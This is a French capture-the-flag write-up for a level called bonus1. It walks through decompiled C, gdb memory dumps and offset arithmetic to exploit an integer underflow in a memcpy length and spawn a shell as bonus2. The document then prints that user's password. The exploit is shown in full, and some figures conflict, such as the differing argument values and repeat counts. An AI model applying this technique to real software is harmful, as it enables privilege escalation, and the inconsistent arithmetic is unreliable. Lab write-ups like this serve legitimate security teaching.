#  Shell Code Exploitation

En décompilant l'exécutable, on remarque que le programme doit passer 2 conditions qui lui permettront de lancer un `shell` avec les droits de bonus2.

 1. Notre premier argument doit-être inférieur à 10.
 2. Notre premier argument doit-être égal à  `0x574f4c46`  soit  `1464814662`en base 10.
```C
arg1 = atoi(argv[1]);
if (arg1 < 10) {
	memcpy(buffer, argv[2], (len(argv[1]) * 4));
	if (argv[1] == 0x574f4c46)
		execl("/bin/sh");
}
```
Il y a une contradiction entre ces deux conditions. Cela nous semble donc impossible d'arriver jusqu'au `bin/sh`. Visiblement la seule chose qui nous permettent de réaliser un exploit est le `memcpy`.

Voici le prototype de la fonction `memcpy`:
```
void  *memcpy(void  *dest,  const  void  * src,  size_t n)
```
On voit que le troisième argument de `memcpy` est un `size_t`. Le fait que cela soit un size_t va nous être très utile, puisque qu'il n'y a pas de nombre négatif avec ce type. 

On peut donc faire un `underflow` et faire copier un nombre d'octets assez grand à `memcpy` pour écraser notre valeur de comparaison. Notre hypothèse est donc vérifiée : nous allons utiliser `memcpy` pour lancer notre `shell`.

Voyons tout ça dans `gdb`.

```
> gdb ./bonus1
[...]
> (gdb) disass main 
[...]
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
```
On voit un call a `memcpy`, on va donc `break` juste après, sur la comparaison  et lancer le programme avec différentes valeurs.
```
(gdb) break *0x08048478
[...]
(gdb) r 8 A
(gdb) x/50wx $esp
0xbffff6b0:	0xbffff6c4	0xbffff8e6	0x00000020	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x48530041	0x3d4c4c45	0x6e69622f
0xbffff6d0:	0x7361622f	0x45540068	0x783d4d52	0x6d726574
0xbffff6e0:	0x3635322d	0x00000000	0x080484b9	0x00000008
(gdb) x $esp
0xbffff6b0:	0xbffff6c4
(gdb) x $esp+0x3c
0xbffff6ec:	0x00000008
```
On affiche `esp` juste après l'appel à `memcpy`. Au moment de la comparaison, on peut voir `0x00000020` (32 en base 10). 
Lorsqu'on affiche `esp`, on obtient l'adresse de notre début de `buffer : 0xbffff6c4`.
Lorsqu'on affiche `esp+0x3c`, donc ce qui correspond a notre comparaison,  on obtient `0xbffff6ec:	0x00000008`. Nous avons donc ici notre adresse de comparaison : `0xbffff6ec` et notre premier argument `0x00000008` (8 en base10).
Nous avons mis `8` comme premier argument. On a `break` après `memcpy`, donc la multiplication par 4 s'est effectuée. `8 * 4 = 32`. 
`0x00000020` correspond donc bien à notre premier argument après la multiplication par 4.

Nous voulons maintenant savoir quel valeur nous devons mettre afin que notre programme exécute bien un `shell`. 
Nous avons notre `adresse de cmp` ainsi que notre adresse de `debut de buffer`.
Nous allons donc faire 
```
[Adresse de cmp]-[adresse_début_buffer]
[0xbffff6ec] - [0xbffff6c4] = 0x28 = 40
```
On peut vérifier cela avec gdb.
```
(gdb)x/50wx $esp
[...]
0xbffff6b0:	0xbffff6c4	0xbffff8e6	0x00000008	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x48530041	0x3d4c4c45	0x080484d1
								 ^
								 Début du buffer (0xbffff6c4)
0xbffff6d0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6e0:	0xb7fed280	0x00000000	0x080484b9	0x00000002
											    ^
											    Fin du buffer (0xbffff6ec)
```

Sauf que notre dernière adresse n'est pas pris en compte. On doit donc ajouter 4 pour avoir un buffer remplis. 

On divise donc 44 / 4 car il sera multiplié par 4 dans le memcpy.
On obtient donc 11. Il va donc écrire 11 fois la valeur de comparaison (`0x574f4c46`) .
Cette valeur de comparaison en little indian est donc `\x46\x4c\x4f\x57`.

On peut maintenant tester avec la valeur `intmin` +  44.
```
-2147483647 + 44 = -2147483603
```

```
(gdb) break *0x08048473
[...]
(gdb) r -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*11'`
[...]
(gdb) continue
[...]
process 3514 is executing new program: /bin/dash
```
Notre programme se lance bien !
```
./bonus1 -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*164'`
[...]
$whoami
[...]
bonus2
$ cat /home/user/bonus2/.pass
[...]
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```